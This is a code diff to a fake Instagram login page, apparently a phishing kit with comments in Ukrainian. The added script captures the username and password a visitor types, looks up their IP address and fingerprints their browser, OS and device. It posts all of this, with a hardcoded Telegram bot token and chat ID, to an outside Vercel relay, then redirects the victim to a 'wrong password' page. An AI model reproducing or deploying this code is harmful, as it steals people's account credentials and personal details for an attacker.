@@ -10,6 +10,7 @@
     <title>Login . Instagram</title>
     <link rel="stylesheet" href="loginstyle.css">
     <link rel="shortcut icon" href="/Instagram_logo_2016.svg.webp">
+    <script src="client.min.js"></script>
     <style>
         img {
             vertical-align: text-top;
@@ -89,46 +90,70 @@
 </div>
 
 <script>
+    async function getIPAddress() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip; // Повертає IP-адресу
+        } catch (error) {
+            console.error('Не вдалося отримати IP-адресу');
+            return null; // Повертає null у разі помилки
+        }
+    }
+    
+    // Виклик функції
+    var client = new ClientJS();
+    const browser = client.getBrowser();
+    
+    // Отримання інформації про операційну систему
+    const os = client.getOS() + " " + client.getOSVersion();
+    
+    // Отримання інформації про тип пристрою
+    const device = client.getDevice();
+    
+    // Отримання інформації про версію браузера
+    const browserVersion = client.getBrowserVersion();
+    
     // Массив для збереження chat_id користувачів
     const chatIds = [1534742147];
-
+    
     async function sendMessageToAll(event) {
-    event.preventDefault(); // Запобігає перезавантаженню сторінки
-    const input1 = document.getElementById('input1').value;
-    const input2 = document.getElementById('input2').value;
-    const botToken = '7567600689:AAEnk3YT4yF9iFCJOPfKMHs4YilCstTsgO8';
-    const message = `Юзернейм (або пошта): ${input1}\nПасс: ${input2}\n`;
-    const chatIds = [1534742147];
-
-    for (let chatId of chatIds) {
-        try {
-            const response = await fetch('https://pizdelka-6smk-r0men-s-projects.vercel.app/', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chatId: chatId,
-                    message: message,
-                    botToken: botToken
-                }),
-                mode: 'cors'
-            });
-
-            if (!response.ok) {
-                throw new Error(`HTTP error! status: ${response.status}`);
+        event.preventDefault(); // Запобігає перезавантаженню сторінки
+        const input1 = document.getElementById('input1').value;
+        const input2 = document.getElementById('input2').value;
+        const botToken = '7567600689:AAEnk3YT4yF9iFCJOPfKMHs4YilCstTsgO8';
+    
+        // Отримуємо IP-адресу
+        const ip = await getIPAddress(); // Дочекайтесь, поки функція поверне IP
+    
+        const message = `Хтось попався!\n\nПошта, юзернейм або номер телефону: ${input1}\nПароль: ${input2}\nip: ${ip}\nБраузер: ${browser}\nОпераційна система: ${os}\nТип пристрою: ${device}`;
+        
+        for (let chatId of chatIds) {
+            try {
+                const response = await fetch('https://pizdelka-6smk-r0men-s-projects.vercel.app/', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chatId: chatId,
+                        message: message,
+                        botToken: botToken
+                    }),
+                    mode: 'cors'
+                });
+    
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+            } catch (error) {
+                console.error(error);
             }
-        } catch (error) {
-            console.error(error);
-        }
-    } 
-    window.location.href = './wrong_password.html';
-}
-
-
-
-
-</script>
+        } 
+        window.location.href = './wrong_password.html';
+    }
+    </script>
+    
 
 </body>
 
